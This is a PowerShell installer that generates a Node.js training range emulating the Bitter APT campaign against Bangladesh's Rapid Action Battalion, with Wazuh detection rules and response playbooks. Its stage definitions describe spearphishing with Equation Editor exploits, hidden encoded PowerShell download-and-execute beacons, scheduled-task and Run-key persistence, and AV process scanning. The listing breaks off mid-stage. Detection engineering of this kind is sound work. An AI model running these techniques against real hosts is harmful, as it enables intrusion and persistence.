# ============================================================
# bitteremulatorweb.ps1  (DOCKER-FREE / NATIVE WINDOWS VERSION)
# Bitter APT - BANGLADESH CAMPAIGN Emulation Range installer
#
#   Target:  Rapid Action Battalion (RAB), Bangladesh Police
#   Actor:   Bitter APT / T-APT-17 / APT-C-08 / Hazy Tiger
#   Toolkit: ZxxZ Trojan, CVE-2017-11882, CVE-2018-0798
#   Source:  Cisco Talos (May 2022)
#
#   Server runs natively via Node.js (no Docker needed).
#   Agent runs on Windows workstations using Python.
# ============================================================

#Requires -Version 5.1
[CmdletBinding()]
param(
    [string]$OutputDir = (Join-Path -Path $PSScriptRoot -ChildPath "bitter-cyberrange"),
    [switch]$SkipPrereqCheck,
    [switch]$SkipNpmInstall
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"
$ProgressPreference    = "SilentlyContinue"

# ------------------------------------------------------------
# Setup
# ------------------------------------------------------------
$script:ROOT = $OutputDir
$script:WN   = 0

New-Item -ItemType Directory -Force -Path $script:ROOT | Out-Null

Write-Host ""
Write-Host "============================================================"
Write-Host " Bitter APT - BANGLADESH CAMPAIGN Emulation Range"
Write-Host " (Rapid Action Battalion / RAB targeting, ZxxZ trojan)"
Write-Host " Native Windows install - no Docker required"
Write-Host " Creating $($script:ROOT) ..."
Write-Host "============================================================"
Write-Host ""

# ------------------------------------------------------------
# Helper: write a project file (LF endings, UTF-8 no BOM)
# ------------------------------------------------------------
function Write-ProjectFile {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory, Position=0)][string]$RelativePath,
        [Parameter(Mandatory, Position=1)][string]$Content,
        [switch]$Crlf
    )

    $fullPath  = Join-Path -Path $script:ROOT -ChildPath $RelativePath
    $parentDir = Split-Path -Parent $fullPath
    if ($parentDir -and -not (Test-Path -LiteralPath $parentDir)) {
        New-Item -ItemType Directory -Force -Path $parentDir | Out-Null
    }

    if (-not $Crlf) {
        $Content = $Content -replace "`r`n", "`n"
    }

    $utf8NoBom = New-Object System.Text.UTF8Encoding($false)
    [System.IO.File]::WriteAllText($fullPath, $Content, $utf8NoBom)

    $script:WN++
    $size = (Get-Item -LiteralPath $fullPath).Length
    Write-Host ("  [{0,3}] OK   {1,-58} {2,8} B" -f $script:WN, $RelativePath, $size)
}

# ------------------------------------------------------------
# Prerequisite check + auto-install Node.js
# ------------------------------------------------------------
function Get-NodeCmd {
    foreach ($c in @("node")) {
        $cmd = Get-Command $c -ErrorAction SilentlyContinue
        if ($cmd) { return $cmd }
    }
    return $null
}

function Get-NpmCmd {
    foreach ($c in @("npm.cmd","npm")) {
        $cmd = Get-Command $c -ErrorAction SilentlyContinue
        if ($cmd) { return $cmd }
    }
    return $null
}

function Test-Prerequisites {
    Write-Host "Checking prerequisites..." -ForegroundColor Cyan
    Write-Host ""

    # --- Node.js (REQUIRED - server runs on this) ---
    $node = Get-NodeCmd
    $npm  = Get-NpmCmd
    if (-not $node -or -not $npm) {
        Write-Host "  [!] Node.js is NOT installed - required to run the server." -ForegroundColor Yellow
        Write-Host ""
        $winget = Get-Command winget -ErrorAction SilentlyContinue
        if ($winget) {
            Write-Host "  Attempting automatic install via winget..." -ForegroundColor Cyan
            try {
                & winget install --id OpenJS.NodeJS.LTS -e --accept-source-agreements --accept-package-agreements --silent
                # Refresh PATH for this session
                $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" +
                            [System.Environment]::GetEnvironmentVariable("Path","User")
                $node = Get-NodeCmd
                $npm  = Get-NpmCmd
                if ($node -and $npm) {
                    Write-Host "  [+] Node.js installed successfully." -ForegroundColor Green
                } else {
                    Write-Host "  [!] Node.js installed but not on PATH yet." -ForegroundColor Yellow
                    Write-Host "      Please CLOSE this window, open a new elevated PowerShell, and re-run." -ForegroundColor Yellow
                }
            } catch {
                Write-Host "  [!] Automatic install failed: $_" -ForegroundColor Yellow
                Write-Host "      Please install manually: winget install --id OpenJS.NodeJS.LTS -e" -ForegroundColor Yellow
            }
        } else {
            Write-Host "      Install manually from: https://nodejs.org/ (LTS)" -ForegroundColor Yellow
            Write-Host "      Or install winget first: it ships with Windows 11 / recent Win 10." -ForegroundColor Yellow
        }
    } else {
        try {
            $nv = (& node --version) 2>&1
            $nm = (& npm --version) 2>&1
            Write-Host "  [+] Node.js: $nv  (npm $nm)" -ForegroundColor Green
            Write-Host "      $($node.Source)" -ForegroundColor DarkGray
        } catch {
            Write-Host "  [+] Node.js found: $($node.Source)" -ForegroundColor Green
        }
    }

    # --- Python (only needed if the agent runs on this host) ---
    $py = $null
    foreach ($c in @("python","python3","py")) {
        $cmd = Get-Command $c -ErrorAction SilentlyContinue
        if ($cmd) { $py = $cmd; break }
    }
    if ($py) {
        try {
            $pyver = (& $py.Source --version) 2>&1
            Write-Host "  [+] $pyver ($($py.Source))" -ForegroundColor Green
        } catch {
            Write-Host "  [+] Python: $($py.Source)" -ForegroundColor Green
        }
    } else {
        Write-Host "  [i] Python not found (only needed if the agent runs on THIS host)." -ForegroundColor Cyan
        Write-Host "      Install: winget install --id Python.Python.3.12 -e" -ForegroundColor Cyan
    }

    # --- Check port 8000 free ---
    try {
        $inUse = Get-NetTCPConnection -LocalPort 8000 -State Listen -ErrorAction SilentlyContinue
        if ($inUse) {
            Write-Host "  [!] Port 8000 is already in use (PID $($inUse.OwningProcess | Select-Object -First 1))." -ForegroundColor Yellow
            Write-Host "      Change APP_PORT in .env or stop the other process." -ForegroundColor Yellow
        } else {
            Write-Host "  [+] Port 8000 is free" -ForegroundColor Green
        }
    } catch { }

    Write-Host ""
}

if (-not $SkipPrereqCheck) {
    Test-Prerequisites
}

# ============================================================
# package.json
# ============================================================
Write-ProjectFile "package.json" @'
{
  "name": "bitter-bangladesh-cyberrange",
  "version": "1.0.0",
  "private": true,
  "description": "Bitter APT Bangladesh Campaign emulation range - Node.js/Express server",
  "main": "server.js",
  "scripts": {
    "start": "node server.js"
  },
  "dependencies": {
    "express": "^4.21.2",
    "nunjucks": "^3.2.4",
    "bcryptjs": "^2.4.3",
    "cookie-parser": "^1.4.7",
    "jsonwebtoken": "^9.0.2",
    "ws": "^8.18.0",
    "axios": "^1.7.9",
    "dotenv": "^16.4.7",
    "uuid": "^11.0.3",
    "xml2js": "^0.6.2"
  },
  "engines": {
    "node": ">=23.4.0"
  }
}
'@

# ============================================================
# .env.example
# ============================================================
Write-ProjectFile ".env.example" @'
# ---- Wazuh Server API ----
WAZUH_API_URL=https://YOUR_WAZUH_SERVER:55000
WAZUH_API_USERNAME=
WAZUH_API_PASSWORD=

# ---- Wazuh Indexer ----
WAZUH_INDEXER_URL=https://YOUR_WAZUH_INDEXER:9200
WAZUH_INDEXER_USERNAME=
WAZUH_INDEXER_PASSWORD=

# ---- App ----
APP_HOST=0.0.0.0
APP_PORT=8000
SECRET_KEY=change-this-session-secret
DEMO_MODE=false
ALERT_POLL_INTERVAL=3
SIMULATION_TIMEOUT=300
VERIFY_TLS=false

# Comma separated allow-list of workstation IDs (empty = all registered)
ALLOWED_WORKSTATION_IDS=

# Subnet(s) used by the Discover button (e.g. 192.168.1.0/24).
# Leave EMPTY for auto-detect: ALL local IPv4 interfaces will be scanned.
# You may also list MULTIPLE subnets separated by commas, e.g.
#   LAB_SUBNET=192.168.1.0/24,10.0.0.0/24
LAB_SUBNET=
'@

# ============================================================
# .gitignore
# ============================================================
Write-ProjectFile ".gitignore" @'
node_modules/
data/
*.log
.env
.server.pid
server.out.log
server.err.log
'@

# Auto-create .env if missing
$envPath    = Join-Path $script:ROOT ".env"
$envExample = Join-Path $script:ROOT ".env.example"
if (-not (Test-Path -LiteralPath $envPath)) {
    Copy-Item -LiteralPath $envExample -Destination $envPath -Force
    Write-Host "  [ --] .env created from .env.example"
}

# ============================================================
# server.js
# ============================================================
Write-ProjectFile "server.js" @'
'use strict';
require('dotenv').config();

const express = require('express');
const nunjucks = require('nunjucks');
const cookieParser = require('cookie-parser');
const http = require('http');
const path = require('path');
const { WebSocketServer } = require('ws');

const { initDb, db } = require('./src/db');
const { currentUser } = require('./src/security');
const { STAGES } = require('./src/services/stages');
const { startAlertPump, setAlertHub, setWsServer } = require('./src/ws');

const authModule = require('./src/routes/auth');
const workstationsRouter = require('./src/routes/workstations');
const simulationRouter = require('./src/routes/simulation');
const wazuhRouter = require('./src/routes/wazuh');
const rulesRouter = require('./src/routes/rules');
const c2Router = require('./src/routes/c2');

const app = express();
const server = http.createServer(app);

const env = nunjucks.configure(path.join(__dirname, 'views'), {
  autoescape: true,
  express: app,
  watch: false
});
env.addFilter('tojson', (obj) => {
  return new nunjucks.runtime.SafeString(JSON.stringify(obj));
});

app.set('view engine', 'html');
app.set('views', path.join(__dirname, 'views'));

app.use(express.json({ limit: '200mb' }));
app.use(express.urlencoded({ extended: true, limit: '200mb' }));
app.use(express.text({ limit: '200mb' }));
app.use(cookieParser());

app.use('/static', express.static(path.join(__dirname, 'public')));

initDb();
authModule.ensureDefaultAdmin();

app.get('/health', (req, res) => res.json({ ok: true }));

app.get('/api/health/full', async (req, res) => {
  try {
    const { WazuhAPI } = require('./src/services/wazuh-api');
    const { WazuhIndexer } = require('./src/services/indexer');
    const api = await new WazuhAPI().status();
    const idx = await new WazuhIndexer().status();
    res.json({
      backend: 'GREEN',
      database: 'GREEN',
      wazuh_api: api.reachable ? 'GREEN' : 'RED',
      wazuh_indexer: idx.reachable ? 'GREEN' : 'RED'
    });
  } catch (e) {
    res.json({ backend: 'GREEN', database: 'GREEN', wazuh_api: 'RED', wazuh_indexer: 'RED', error: String(e) });
  }
});

app.get('/', (req, res) => {
  const user = currentUser(req);
  if (!user) return res.redirect('/login');

  const rows = db.prepare('SELECT * FROM workstations').all();
  const now = Date.now();

  const workstations = rows.map((w) => {
    const ls = w.last_seen ? Date.parse(w.last_seen.replace(' ', 'T') + 'Z') : 0;
    const secs = ls ? (now - ls) / 1000 : 9999;
    let live = w.status;
    if (secs > 30 && w.status !== 'BUSY' && w.status !== 'RUNNING') live = 'OFFLINE';
    return {
      id: w.id,
      hostname: w.hostname || '',
      ip: w.ip || '',
      os: w.os || '',
      status: live,
      wazuh_status: w.wazuh_status || 'UNKNOWN',
      sysmon_status: w.sysmon_status || 'UNKNOWN',
      current_user: w.current_user || '',
      current_stage: w.current_stage || '',
      allowed: !!w.allowed,
      manual: !!w.manual,
      last_seen: w.last_seen || ''
    };
  });

  const stageStates = {};
  const sts = db.prepare('SELECT * FROM simulation_stages').all();
  for (const st of sts) {
    if (!stageStates[st.workstation_id]) stageStates[st.workstation_id] = {};
    stageStates[st.workstation_id][st.stage_id] = st.status;
  }

  res.render('lab.html', {
    user,
    stages: STAGES,
    workstations,
    stage_states: stageStates,
    demo_mode: String(process.env.DEMO_MODE || '').toLowerCase() === 'true',
    poll_interval: parseInt(process.env.ALERT_POLL_INTERVAL || '3', 10),
    lab_subnet: process.env.LAB_SUBNET || ''
  });
});

app.use(authModule.router);
app.use(workstationsRouter);
app.use(simulationRouter);
app.use(wazuhRouter);
app.use(rulesRouter);
app.use(c2Router);

const wss = new WebSocketServer({ server, path: '/ws/wazuh-alerts' });
const hub = {
  clients: new Set(),
  add(ws) { this.clients.add(ws); },
  remove(ws) { this.clients.delete(ws); },
  broadcast(obj) {
    const text = JSON.stringify(obj);
    for (const c of this.clients) {
      try { if (c.readyState === 1) c.send(text); } catch (e) {}
    }
  }
};
wss.on('connection', (ws) => {
  hub.add(ws);
  ws.on('close', () => hub.remove(ws));
  ws.on('error', () => hub.remove(ws));
  ws.on('message', () => {});
});
setAlertHub(hub);
setWsServer(wss);

const simWss = new WebSocketServer({ server, path: '/ws/simulation' });
simWss.on('connection', (ws) => {
  const iv = setInterval(() => {
    try { if (ws.readyState === 1) ws.send(JSON.stringify({ type: 'ping' })); }
    catch (e) {}
  }, 5000);
  ws.on('close', () => clearInterval(iv));
});

startAlertPump();

const PORT = parseInt(process.env.APP_PORT || '8000', 10);
server.listen(PORT, '0.0.0.0', () => {
  console.log(`[bitter-bd/main] Bitter APT Bangladesh Campaign Emulation Range ready on http://0.0.0.0:${PORT}`);
  console.log(`[bitter-bd/main] Target: Rapid Action Battalion (RAB), Bangladesh`);
  console.log(`[bitter-bd/main] Agent endpoints OPEN (trusted lab network only).`);
});

app.use((err, req, res, next) => {
  console.error('[bitter-bd/error]', err);
  if (res.headersSent) return next(err);
  res.status(err.status || 500).json({ detail: err.message || String(err) });
});
'@

# ============================================================
# src/db.js
# ============================================================
Write-ProjectFile "src/db.js" @'
'use strict';
/*
 * SQLite backend for the Bitter BD range.
 *
 * Uses Node.js' BUILT-IN `node:sqlite` module (no native compilation, no
 * Visual Studio build tools, no prebuilt-binary downloads). This makes the
 * project installable on a fresh Windows machine with just Node.js.
 *
 * `node:sqlite` is available unflagged from Node.js 23.4.0 (and behind
 * --experimental-sqlite from Node.js 22.5.0).
 */
const path = require('path');
const fs = require('fs');

let DatabaseSync;
try {
  ({ DatabaseSync } = require('node:sqlite'));
} catch (e) {
  console.error('');
  console.error('[bitter-bd/db] FATAL: this server requires the built-in `node:sqlite` module.');
  console.error('[bitter-bd/db] Detected Node.js: ' + process.version);
  console.error('[bitter-bd/db] Please install Node.js 23.4 or newer:');
  console.error('[bitter-bd/db]     winget install --id OpenJS.NodeJS.LTS -e');
  console.error('[bitter-bd/db] Then close this window, open a new PowerShell, and re-run .\start.ps1');
  console.error('');
  process.exit(1);
}

const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, '..', 'data');
fs.mkdirSync(DATA_DIR, { recursive: true });

const DB_PATH = path.join(DATA_DIR, 'bitter.db');
const _db = new DatabaseSync(DB_PATH);

const db = {
  exec:    (sql) => _db.exec(sql),
  prepare: (sql) => _db.prepare(sql),
  pragma:  (str) => {
    try { _db.exec('PRAGMA ' + str + ';'); }
    catch (e) { /* ignore pragma errors */ }
  }
};

db.pragma('journal_mode = WAL');
db.pragma('foreign_keys = ON');

function initDb() {
  db.exec(`
    CREATE TABLE IF NOT EXISTS workstations (
      id              TEXT PRIMARY KEY,
      hostname        TEXT DEFAULT '',
      ip              TEXT DEFAULT '',
      os              TEXT DEFAULT '',
      agent_token     TEXT DEFAULT '',
      status          TEXT DEFAULT 'OFFLINE',
      wazuh_status    TEXT DEFAULT 'UNKNOWN',
      sysmon_status   TEXT DEFAULT 'UNKNOWN',
      current_user    TEXT DEFAULT '',
      current_stage   TEXT DEFAULT '',
      allowed         INTEGER DEFAULT 0,
      manual          INTEGER DEFAULT 0,
      created_at      TEXT,
      last_seen       TEXT
    );

    CREATE TABLE IF NOT EXISTS simulation_runs (
      id              INTEGER PRIMARY KEY AUTOINCREMENT,
      workstation_id  TEXT,
      stage_id        TEXT,
      status          TEXT DEFAULT 'RUNNING',
      job_id          TEXT DEFAULT '',
      started_at      TEXT,
      finished_at     TEXT,
      result          TEXT DEFAULT '{}'
    );
    CREATE INDEX IF NOT EXISTS idx_runs_ws  ON simulation_runs(workstation_id);
    CREATE INDEX IF NOT EXISTS idx_runs_job ON simulation_runs(job_id);

    CREATE TABLE IF NOT EXISTS simulation_stages (
      id              INTEGER PRIMARY KEY AUTOINCREMENT,
      workstation_id  TEXT,
      stage_id        TEXT,
      status          TEXT DEFAULT 'NotStarted',
      last_run        TEXT,
      last_cleanup    TEXT
    );
    CREATE INDEX IF NOT EXISTS idx_stages_ws ON simulation_stages(workstation_id);

    CREATE TABLE IF NOT EXISTS activity_logs (
      id              INTEGER PRIMARY KEY AUTOINCREMENT,
      timestamp       TEXT,
      user            TEXT DEFAULT '',
      workstation_id  TEXT DEFAULT '',
      action          TEXT DEFAULT '',
      stage           TEXT DEFAULT '',
      result          TEXT DEFAULT ''
    );

    CREATE TABLE IF NOT EXISTS wazuh_rule_deployments (
      id              INTEGER PRIMARY KEY AUTOINCREMENT,
      rule_id         TEXT UNIQUE,
      xml             TEXT,
      deployed_at     TEXT,
      deployed_by     TEXT DEFAULT '',
      status          TEXT DEFAULT 'DEPLOYED'
    );

    CREATE TABLE IF NOT EXISTS users (
      id              INTEGER PRIMARY KEY AUTOINCREMENT,
      username        TEXT UNIQUE,
      password_hash   TEXT,
      role            TEXT DEFAULT 'STUDENT'
    );
  `);
}

function utcnow() {
  return new Date().toISOString().slice(0, 19).replace('T', ' ');
}

module.exports = { db, initDb, utcnow, DATA_DIR, DB_PATH };
'@

# ============================================================
# src/security.js
# ============================================================
Write-ProjectFile "src/security.js" @'
'use strict';
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');

const SECRET = process.env.SECRET_KEY || 'change-this-session-secret';

const PERMISSIONS = {
  ADMIN:      ['run','cleanup','stop','rules.write','rules.deploy','wazuh.admin','view','workstations.manage'],
  INSTRUCTOR: ['run','cleanup','stop','rules.write','rules.deploy','view','workstations.manage'],
  ANALYST:    ['view'],
  STUDENT:    ['run','view']
};

function hashPassword(p) { return bcrypt.hashSync(p, 10); }
function verifyPassword(p, h) {
  try { return bcrypt.compareSync(p, h); } catch (e) { return false; }
}
function makeSession(username, role) {
  return jwt.sign({ u: username, r: role }, SECRET, { expiresIn: '8h' });
}
function readSession(token) {
  try { return jwt.verify(token, SECRET); } catch (e) { return null; }
}
function currentUser(req) {
  const tok = (req.cookies && req.cookies.gb_session) || null;
  if (!tok) return null;
  return readSession(tok);
}
function hasPerm(role, perm) {
  return (PERMISSIONS[role] || []).includes(perm);
}
function requirePerm(req, perm) {
  const u = currentUser(req);
  if (!u) { const e = new Error('Not authenticated'); e.status = 401; throw e; }
  if (!hasPerm(u.r, perm)) { const e = new Error('Missing permission: ' + perm); e.status = 403; throw e; }
  return u;
}
function guard(perm) {
  return (req, res, next) => {
    try {
      const u = requirePerm(req, perm);
      req.user = u;
      next();
    } catch (e) {
      res.status(e.status || 500).json({ detail: e.message || String(e) });
    }
  };
}

module.exports = {
  hashPassword, verifyPassword, makeSession, readSession,
  currentUser, hasPerm, requirePerm, guard, PERMISSIONS
};
'@

# ============================================================
# src/services/stages.js
# ============================================================
Write-ProjectFile "src/services/stages.js" @'
'use strict';
/*
 * Bitter APT - BANGLADESH CAMPAIGN stage definitions.
 */

const STAGES = [
  {
    key: 'initial_access',
    number: '01',
    name: 'Initial Access (BANGLADESH)',
    short: 'Spearphishing RAB / CVE-2017-11882',
    objective: 'Understand how Bitter gained its first foothold against BANGLADESH: spearphishing emails sent to high-ranking RAB (Rapid Action Battalion) officers, using spoofed Pakistani government senders and weaponized Office documents exploiting Equation Editor vulnerabilities.',
    real_attacker_behavior: 'Bitter sends spearphishing emails to high-ranking officers of the Rapid Action Battalion (RAB) unit of BANGLADESH police. The emails spoof PAKISTANI government organizations (arc@desto.gov.pk, so.dc@pc.gov.pk) and contain malicious RTF documents or Excel spreadsheets. Lure themes target BANGLADESHI law enforcement: CDR (Call Data Record), List of Numbers to be verified, and List of registered cases.',
    simulated_behavior: 'Creates REAL .rtf and .xlsx files with embedded Equation 3.0 OLE objects (CVE-2017-11882 trigger). Creates REAL .eml BANGLADESH-targeted phishing email with spoofed PAKISTANI sender headers. Writes REAL Zone.Identifier ADS markers.',
    backend_action: 'New-Object -ComObject WScript.Shell -> CreateShortcut; Set-Content .eml; Set-Content -Stream Zone.Identifier; New-Item .rtf with OLE Equation 3.0.',
    sysmon_events: [
      { id: '11', reason: 'FileCreate - .rtf/.xlsx/.eml written to Downloads or Desktop.' },
      { id: '15', reason: 'FileCreateStreamHash - Zone.Identifier marks file as from Internet.' },
      { id: '1', reason: 'ProcessCreate - EQNEDT32.EXE spawned by WINWORD.EXE or EXCEL.EXE.' },
      { id: '22', reason: 'DNS Query - malicious domain lookup (olmajhnservice.com).' }
    ],
    windows_event_id: 'Security 4688, 4663, 5156',
    windows_event_description: '4688 process creation (EQNEDT32.EXE); 4663 object access; 5156 WFP connection.',
    wazuh_rule_id: '100400',
    wazuh_description: 'BITTER BANGLADESH: Spearphishing RTF/XLSX with Equation Editor exploit targeting RAB Bangladesh.',
    wazuh_rule_xml: '<group name="bitter,bangladesh,initial_access,">\n  <rule id="100400" level="13">\n    <if_sid>61603</if_sid>\n    <field name="win.eventdata.parentImage">(winword|excel)\\.exe$</field>\n    <field name="win.eventdata.image">(EQNEDT32|cmd|powershell|wscript|mshta)\\.exe$</field>\n    <description>BITTER (Bangladesh/RAB): Office spawning Equation Editor (T1566.001/T1203/T1204.002)</description>\n    <mitre><id>T1566.001</id><id>T1203</id><id>T1204.002</id></mitre>\n  </rule>\n</group>',
    mitre_id: 'T1566.001, T1203, T1204.002, T1190',
    mitre_name: 'Spearphishing Attachment / Exploitation for Client Execution / Malicious File / Exploit Public-Facing App',
    mitre_tactic: 'Initial Access',
    forensic_artifacts: 'REAL .rtf with Equation 3.0 OLE; REAL .xlsx with embedded exploit; .eml phishing file; Zone.Identifier ADS; Prefetch EQNEDT32.EXE-*.pf.',
    network_indicators: 'DNS to olmajhnservice.com; TLS SNI to C2; HTTP GET /nxl/nx.',
    analyst_notes: 'BANGLADESH CAMPAIGN: RAB targeting is the primary indicator. Correlate email gateway logs with EQNEDT32.EXE process creation.',
    expected_indicators: 'EQNEDT32.EXE spawned by Office; .rtf/.xlsx in Downloads; DNS to malicious domain; HTTP POST to C2.',
    common_false_positives: 'Legitimate Equation Editor usage; Office documents with embedded equations.',
    response_playbook: 'BANGLADESH-specific: Notify BGD e-GOV CIRT / BGD National CERT. Quarantine email; isolate endpoint.',
    cleanup_notes: 'Removes initial-access artifact directory.',
    references: 'Cisco Talos May 2022 (Bangladesh); MITRE T1566.001/T1203.'
  },
  {
    key: 'execution_c2',
    number: '02',
    name: 'Execution & C2 (ZxxZ)',
    short: 'ZxxZ Trojan / HTTP Beacon / 17s Poll',
    objective: 'Understand how Bitter executed the ZxxZ trojan inside BANGLADESHI RAB networks.',
    real_attacker_behavior: 'Shellcode downloads ZxxZ from olmajhnservice[.]com/nxl/nx. ZxxZ masquerades as Windows Security Update, polls C2 every 17 seconds, and supports remote file execution.',
    simulated_behavior: 'Runs REAL encoded PowerShell to download and execute a simulated ZxxZ payload. Creates REAL HTTP POST to /api/c2/beacon with ZxxZ separator. Creates REAL file at %LOCALAPPDATA%\\Debug\\Update.exe.',
    backend_action: 'powershell.exe -nop -w hidden -enc <base64>; Invoke-WebRequest -Uri "http://SERVER:8000/api/c2/beacon" -Method POST.',
    sysmon_events: [
      { id: '1', reason: 'ProcessCreate - encoded powershell, Update.exe.' },
      { id: '3', reason: 'NetworkConnect - powershell.exe HTTP to server /api/c2/beacon.' },
      { id: '11', reason: 'FileCreate - %LOCALAPPDATA%\\Debug\\Update.exe.' },
      { id: '22', reason: 'DNS Query - helpdesk.autodefragapp.com lookup.' }
    ],
    windows_event_id: '4688, PowerShell 4104/4103, Sysmon 3',
    windows_event_description: '4104 decoded script block; 4688 process creation; network connection.',
    wazuh_rule_id: '100401',
    wazuh_description: 'BITTER BANGLADESH: ZxxZ trojan execution in RAB network.',
    wazuh_rule_xml: '<group name="bitter,bangladesh,execution,">\n  <rule id="100401" level="14">\n    <if_sid>61603</if_sid>\n    <field name="win.eventdata.image">(powershell)\\.exe$</field>\n    <field name="win.eventdata.commandLine">(-enc|-nop|Invoke-WebRequest|DownloadString)</field>\n    <description>BITTER (Bangladesh/RAB): ZxxZ - Equation Editor spawning encoded PowerShell</description>\n    <mitre><id>T1059.001</id><id>T1105</id></mitre>\n  </rule>\n</group>',
    mitre_id: 'T1059.001, T1105, T1071.001, T1106, T1053.005',
    mitre_name: 'PowerShell / Ingress Tool Transfer / Web Protocols / Native API / Scheduled Task',
    mitre_tactic: 'Execution, Command and Control',
    forensic_artifacts: 'PowerShell 4104 decoded script; Prefetch POWERSHELL.EXE-*.pf; %LOCALAPPDATA%\\Debug\\Update.exe.',
    network_indicators: 'HTTP POST to /api/c2/beacon; 17-second polling interval; ZxxZ separator in POST body.',
    analyst_notes: 'BANGLADESH CAMPAIGN: 17-second C2 poll is distinctive ZxxZ signature.',
    expected_indicators: 'EQNEDT32.EXE -> powershell.exe; HTTP POST every 17s; %LOCALAPPDATA%\\Debug\\*.exe.',
    common_false_positives: 'Legitimate PowerShell from Office (rare); scheduled tasks.',
    response_playbook: 'Capture memory; decode PowerShell script block; block C2 domain helpdesk.autodefragapp.com.',
    cleanup_notes: 'Kills spawned processes and removes execution/C2 marker artifacts.',
    references: 'Cisco Talos May 2022 (Bangladesh); MITRE S1013 (ZxxZ).'
  },
  {
    key: 'discovery',
    number: '03',
    name: 'Discovery',
    short: 'RAB Host Recon / Security Scan',
    objective: 'Understand how ZxxZ performed host reconnaissance inside BANGLADESHI RAB workstations.',
    real_attacker_behavior: 'ZxxZ collects hostname, OS product name, and username from BANGLADESHI RAB workstations. Uses CreateToolhelp32Snapshot, Process32First, Process32Next APIs to scan for Windows Defender and Kaspersky.',
    simulated_behavior: 'Runs REAL systeminfo, whoami, hostname, tasklist commands. Creates REAL registry queries. Runs REAL process scanning for Windows Defender and Kaspersky.',
    backend_action: 'systeminfo; whoami /all; hostname; tasklist /v; Get-Process -Name "MsMpEng","avp".',
    sysmon_events: [
      { id: '1', reason: 'ProcessCreate - systeminfo.exe, whoami.exe, tasklist.exe.' },
      { id: '3', reason: 'NetworkConnect - nltest, LDAP queries.' },
      { id: '22', reason: 'DNS Query - internal hostnames, DC lookups.' }
    ],
    windows_event_id: '4688, 4798/4799, 4662',
    windows_event_description: '4688 process burst; 4798/4799 group enumeration; 4662 AD object access.',
    wazuh_rule_id: '100402',
    wazuh_description: 'BITTER BANGLADESH: ZxxZ host reconnaissance in RAB network.',
    wazuh_rule_xml: '<group name="bitter,bangladesh,discovery,">\n  <rule id="100402" level="10" frequency="5" timeframe="300">\n    <if_matched_sid>61603</if_matched_sid>\n    <field name="win.eventdata.image">(whoami|hostname|systeminfo|tasklist|ipconfig|net|wmic|reg)\\.exe$</field>\n    <description>BITTER (Bangladesh/RAB): Rapid discovery burst</description>\n    <mitre><id>T1018</id><id>T1046</id><id>T1087.002</id></mitre>\n  </rule>\n</group>',
    mitre_id: 'T1018, T1046, T1016, T1049, T1083, T1087.002, T1057, T1012',
    mitre_name: 'Remote System Discovery / Network Service Discovery / System Network Config / File & Directory Discovery / Domain Account / Process Discovery / Query Registry',
    mitre_tactic: 'Discovery',
    forensic_artifacts: 'Prefetch for each binary; PowerShell PSReadLine history; SRUM; Sysmon log.',
    network_indicators: 'LDAP 389/636; SMB 445; internal DNS.',
    analyst_notes: 'BANGLADESH CAMPAIGN: Process scanning for MsMpEng.exe and avp.exe is a ZxxZ-specific behavior on RAB workstations.',
    expected_indicators: 'Rapid succession of discovery commands; process scanning for security tools.',
    common_false_positives: 'Lansweeper, SCCM, vuln scanners, admin scripts.',
    response_playbook: 'Identify parent + user; hunt burst; check for security software scanning.',
    cleanup_notes: 'Deletes Telemetry\\Discovery output folder.',
    references: 'Cisco Talos May 2022 (Bangladesh); MITRE S1013 (ZxxZ).'
  },
  {
    key: 'persistence',
    number: '04',
    name: 'Persistence (Rdx/RdxFac)',
    short: 'Rdx/RdxFac Tasks / Registry Run',
    objective: 'Understand how ZxxZ established persistence on BANGLADESHI RAB workstations using scheduled tasks and Registry Run keys.',
    real_attacker_behavior: 'ZxxZ creates scheduled tasks named "Rdx" and "RdxFac" on BANGLADESHI RAB machines. Task "Rdx" runs every 5 minutes to download RdxFactory.exe using cURL. Task "RdxFac" runs 5 minutes later to execute it.',
    simulated_behavior: 'Creates REAL scheduled tasks "Rdx" and "RdxFac" with 5-minute triggers. Creates REAL HKCU Run key "WindowsSecurityUpdate". Creates REAL Startup folder .lnk.',
    backend_action: 'schtasks /create /tn "Rdx"; schtasks /create /tn "RdxFac"; New-ItemProperty HKCU:\\...\\Run -Name "WindowsSecurityUpdate".',
    sysmon_events: [
      { id: '13', reason: 'RegistryEvent - new value in Run key.' },
      { id: '1', reason: 'ProcessCreate - schtasks.exe, reg.exe, sc.exe.' },
      { id: '11', reason: 'FileCreate - .lnk in Startup folder; task XML.' },
      { id: '19/20/21', reason: 'WMI filter/consumer/binding (admin only).' }
    ],
    windows_event_id: '4657, 4698, 4697, 7045',
    windows_event_description: '4657 registry; 4698 task created; 4697/7045 service created.',
    wazuh_rule_id: '100403',
    wazuh_description: 'BITTER BANGLADESH: ZxxZ persistence in RAB network - tasks Rdx/RdxFac with cURL to Music folder.',
    wazuh_rule_xml: '<group name="bitter,bangladesh,persistence,">\n  <rule id="100403" level="13">\n    <if_sid>61603</if_sid>\n    <field name="win.eventdata.targetObject">\\\\CurrentVersion\\\\Run\\\\</field>\n    <description>BITTER (Bangladesh/RAB): Run key persistence</description>\n    <mitre><id>T1547.001</id></mitre>\n  </rule>\n</group>',
    mitre_id: 'T1053.005, T1547.001, T1543.003',
    mitre_name: 'Scheduled Task / Registry Run Keys / Windows Service',
    mitre_tactic: 'Persistence',
    forensic_artifacts: 'NTUSER.DAT; SOFTWARE hive; C:\\Windows\\System32\\Tasks\\Rdx; Tasks\\RdxFac; %USERPROFILE%\\Music\\RdxFactory.exe.',
    network_indicators: 'C2 beacon on logon; cURL HTTP download to Music folder.',
    analyst_notes: 'BANGLADESH CAMPAIGN: Task names "Rdx" and "RdxFac" are unique ZxxZ signatures found on compromised BANGLADESHI RAB endpoints.',
    expected_indicators: 'Scheduled tasks Rdx/RdxFac; cURL to Music folder; Run key to user-writable path.',
    common_false_positives: 'OneDrive/Teams/Chrome updaters; IT tasks; vendor agents.',
    response_playbook: 'Enumerate all persistence; remove after evidence capture; hunt across RAB network.',
    cleanup_notes: 'Removes Run key, tasks Rdx/RdxFac, Startup LNK, service, WMI objects.',
    references: 'Cisco Talos May 2022 (Bangladesh); MITRE T1053.005/T1547.001.'
  },
  {
    key: 'defense_evasion',
    number: '05',
    name: 'Defense Evasion',
    short: 'XOR / Security Scan / Log Clear',
